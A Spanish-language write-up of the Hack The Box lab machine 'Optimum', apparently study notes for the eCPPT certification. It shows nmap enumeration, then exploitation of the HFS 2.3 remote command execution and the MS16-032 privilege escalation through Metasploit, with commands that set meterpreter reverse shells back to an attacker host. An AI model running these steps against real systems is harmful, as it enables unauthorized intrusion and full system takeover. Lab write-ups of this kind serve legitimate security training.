---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Easy
  - HTTP
  - Searchsploit
  - MSF
  - RemoteCommandExecution
  - MS16-032
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Enumeración del Sistema|Enumeración del Sistema]]
	- [[#Enumeración#Enumeración de Puertos|Enumeración de Puertos]]
	- [[#Enumeración#HTTP|HTTP]]
	- [[#Enumeración#Searchsploit|Searchsploit]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Remote Command Execution|Remote Command Execution]]
- [[#Escalada de Privilegios|Escalada de Privilegios]]
	- [[#Escalada de Privilegios#Búsqueda de Exploits|Búsqueda de Exploits]]
	- [[#Escalada de Privilegios#MS16-032|MS16-032]]

---
# Optimum

![](Screenshots/Pasted%20image%2020260506175203.png)

>Máquina de Hack The Box llamada **[Optimum](https://app.hackthebox.com/machines/Optimum)**, centrada en la explotación de un servicio web vulnerable basado en **HttpFileServer (HFS) 2.3**.
>La intrusión comienza con la enumeración del servicio HTTP, donde se identifica una versión vulnerable de HFS que permite ejecución remota de código (**RCE**) sin autenticación.
>Tras obtener acceso inicial como usuario limitado, se realiza una escalada de privilegios explotando una vulnerabilidad local en Windows (**MS16-032**), logrando acceso como **NT AUTHORITY\SYSTEM**.

---
## Enumeración
### Enumeración del Sistema

```PowerShell
ping -c 1 10.129.32.128
PING 10.129.32.128 (10.129.32.128) 56(84) bytes of data.
64 bytes from 10.129.32.128: icmp_seq=1 ttl=127 time=49.4 ms

--- 10.129.32.128 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 49.402/49.402/49.402/0.000 ms
```

El `TTL=127` indica que probablemente estamos ante un sistema Windows.
### Enumeración de Puertos

```PowerShell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.32.128 -oG allPorts
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127
```

```PowerShell
nmap -p80 -sCV 10.129.32.128 -oN targeted
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Puertos descubiertos:
- `80 → HTTP`
### HTTP

```PowerShell
http://10.129.32.128/
```

![](Screenshots/Pasted%20image%2020260506182057.png)

Se identifica el servicio `HttpFileServer (HFS) 2.3`, una versión vulnerable conocida por permitir ejecución remota de comandos mediante peticiones HTTP especialmente manipuladas.
### Searchsploit

Se buscan vulnerabilidades.

```PowerShell
Searchsploit "HttpFileServer 2.3"
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                                                                                               | windows/webapps/49125.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

El exploit encontrado permite ejecutar comandos de forma remota sin necesidad de autenticación, aprovechando una mala gestión de input en el servidor HFS.

---
## Explotación
### Remote Command Execution

La vulnerabilidad en HFS permite la inyección de comandos a través de parámetros HTTP manipulados. Internamente, el servidor evalúa input del usuario sin validación adecuada, lo que permite ejecutar comandos en el sistema operativo subyacente.

Aunque se utiliza Metasploit para simplificar la explotación, esta vulnerabilidad también puede explotarse manualmente mediante peticiones HTTP construidas específicamente.

```PowerShell
msfconsole -q
msf > search HttpFileServer 2.3
Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
msf > use 0 | use exploit/windows/http/rejetto_hfs_exec
msf exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SRVSSL     false            no        Negotiate SSL/TLS for local server connections
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     [ATTACKER_IP]     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
msf exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.129.32.128
msf exploit(windows/http/rejetto_hfs_exec) > set LHOST [ATTACKER_IP]
msf exploit(windows/http/rejetto_hfs_exec) > exploit
```

Se obtiene una consola interactiva con `optimum\kostas`.

La flag de `usuario` se encuentra en: `C:\Users\kostas\Desktop`.

---
## Escalada de Privilegios
### Búsqueda de Exploits

Dado el acceso como usuario limitado, se procede a enumerar posibles vectores de escalada de privilegios en el sistema.

```PowerShell
meterpreter > background
msf exploit(windows/http/rejetto_hfs_exec) > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
msf post(multi/recon/local_exploit_suggester) > set SESSION 1
msf post(multi/recon/local_exploit_suggester) > exploit
============================

 #   Name                                                              Potentially Vulnerable?  Check Result
 -   ----                                                              -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                         Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                          Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_sluihijack                        Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move      Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
 5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc     Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/tokenmagic                                  Yes                      The target appears to be vulnerable.
 7   exploit/windows/persistence/registry                              Yes                      The target is vulnerable. Registry writable
 8   exploit/windows/persistence/registry_active_setup                 Yes                      The target is vulnerable. Registry writable
 9   exploit/windows/persistence/registry_userinit                     Yes                      The target is vulnerable. Registry likely exploitable
 10  exploit/windows/persistence/service_for_user/lock_unlock          Yes                      The target appears to be vulnerable. Target is likely exploitable
 11  exploit/windows/persistence/service_for_user/logon                Yes                      The target appears to be vulnerable. Target is likely exploitable
 12  exploit/windows/persistence/service_for_user/schedule             Yes                      The target appears to be vulnerable. Target is likely exploitable
 13  exploit/windows/persistence/startup_folder                        Yes                      The target appears to be vulnerable. Likely exploitable, able to write test file to C:\Users\kostas\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup                                                                                                                                                                                                                       
 14  exploit/windows/persistence/userinit_mpr_logon_script             Yes                      The target is vulnerable. Registry path is writable
 15  exploit/multi/persistence/ssh_key                                 No                       The target is not exploitable. sshd_config file not found
 16  exploit/windows/local/adobe_sandbox_adobecollabsync               No                       Cannot reliably check exploitability.
 17  exploit/windows/local/agnitum_outpost_acs                         No                       The target is not exploitable.
 18  exploit/windows/local/always_install_elevated                     No                       The target is not exploitable.
 19  exploit/windows/local/anyconnect_lpe                              No                       The target is not exploitable. vpndownloader.exe not found on file system
 20  exploit/windows/local/bits_ntlm_token_impersonation               No                       The target is not exploitable.
 21  exploit/windows/local/bthpan                                      No                       The target is not exploitable.
 22  exploit/windows/local/bypassuac_fodhelper                         No                       The target is not exploitable.
 23  exploit/windows/local/canon_driver_privesc                        No                       The target is not exploitable. No Canon TR150 driver directory found
 24  exploit/windows/local/cve_2020_1048_printerdemon                  No                       The target is not exploitable.
 25  exploit/windows/local/cve_2020_1337_printerdemon                  No                       The target is not exploitable.
 26  exploit/windows/local/gog_galaxyclientservice_privesc             No                       The target is not exploitable. Galaxy Client Service not found
 27  exploit/windows/local/ikeext_service                              No                       The check raised an exception.
 28  exploit/windows/local/ipass_launch_app                            No                       The check raised an exception.
 29  exploit/windows/local/lenovo_systemupdate                         No                       The check raised an exception.
 30  exploit/windows/local/lexmark_driver_privesc                      No                       The check raised an exception.
 31  exploit/windows/local/mqac_write                                  No                       The target is not exploitable.
 32  exploit/windows/local/ms10_015_kitrap0d                           No                       The target is not exploitable.
 33  exploit/windows/local/ms10_092_schelevator                        No                       The target is not exploitable. Windows Server 2012 R2 (6.3 Build 9600). is not vulnerable
 34  exploit/windows/local/ms13_053_schlamperei                        No                       The target is not exploitable.
 35  exploit/windows/local/ms13_081_track_popup_menu                   No                       Cannot reliably check exploitability.
 36  exploit/windows/local/ms14_058_track_popup_menu                   No                       The target is not exploitable.
 37  exploit/windows/local/ms14_070_tcpip_ioctl                        No                       The target is not exploitable.
 38  exploit/windows/local/ms15_004_tswbproxy                          No                       The target is not exploitable.
 39  exploit/windows/local/ms15_051_client_copy_image                  No                       The target is not exploitable.
 40  exploit/windows/local/ms16_016_webdav                             No                       The target is not exploitable.
 41  exploit/windows/local/ms16_075_reflection                         No                       The target is not exploitable.
 42  exploit/windows/local/ms16_075_reflection_juicy                   No                       The target is not exploitable.
 43  exploit/windows/local/ms_ndproxy                                  No                       The target is not exploitable.
 44  exploit/windows/local/novell_client_nicm                          No                       The target is not exploitable.
 45  exploit/windows/local/ntapphelpcachecontrol                       No                       The check raised an exception.
 46  exploit/windows/local/ntusermndragover                            No                       The target is not exploitable.
 47  exploit/windows/local/panda_psevents                              No                       The target is not exploitable.
 48  exploit/windows/local/ppr_flatten_rec                             No                       The target is not exploitable.
 49  exploit/windows/local/ricoh_driver_privesc                        No                       The target is not exploitable. No Ricoh driver directory found
 50  exploit/windows/local/virtual_box_guest_additions                 No                       The target is not exploitable.
 51  exploit/windows/local/webexec                                     No                       The check raised an exception.
 52  exploit/windows/persistence/accessibility_features_debugger       No                       The target is not exploitable. You have admin rights to run this Module
 53  exploit/windows/persistence/assistive_technology                  No                       The target is not exploitable. You have admin rights to run this Module
 54  exploit/windows/persistence/notepadpp_plugin                      No                       The target is not exploitable. Notepad++ is probably not present
 55  exploit/windows/persistence/service                               No                       The target is not exploitable. You must be System/Admin to run this Module
 56  exploit/windows/persistence/task_scheduler                        No                       The target is not exploitable. You need higher privileges to create scheduled tasks
 57  exploit/windows/persistence/wmi/wmi_event_subscription_event_log  No                       The target is not exploitable. This module requires admin privs to run
 58  exploit/windows/persistence/wmi/wmi_event_subscription_interval   No                       The target is not exploitable. This module requires admin privs to run
 59  exploit/windows/persistence/wmi/wmi_event_subscription_process    No                       The target is not exploitable. This module requires admin privs to run
 60  exploit/windows/persistence/wmi/wmi_event_subscription_uptime     No                       The target is not exploitable. This module requires admin privs to run
```

Entre las vulnerabilidades sugeridas, destaca **MS16-032**, una vulnerabilidad en el manejo de procesos del servicio Secondary Logon que permite escalar privilegios en sistemas Windows afectados.
### MS16-032

Este exploit abusa de una condición de carrera en el servicio Secondary Logon, permitiendo que un proceso con privilegios elevados sea manipulado para ejecutar código arbitrario como SYSTEM.

```PowerShell
msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     [ATTACKER_IP]     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86

msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set SESSION 1
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LPORT 4445
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit
```

Se obtiene una consola interactiva con `nt authority\system`.

La flag de `root` se encuentra en: `C:\Users\Administrator\Desktop`.

---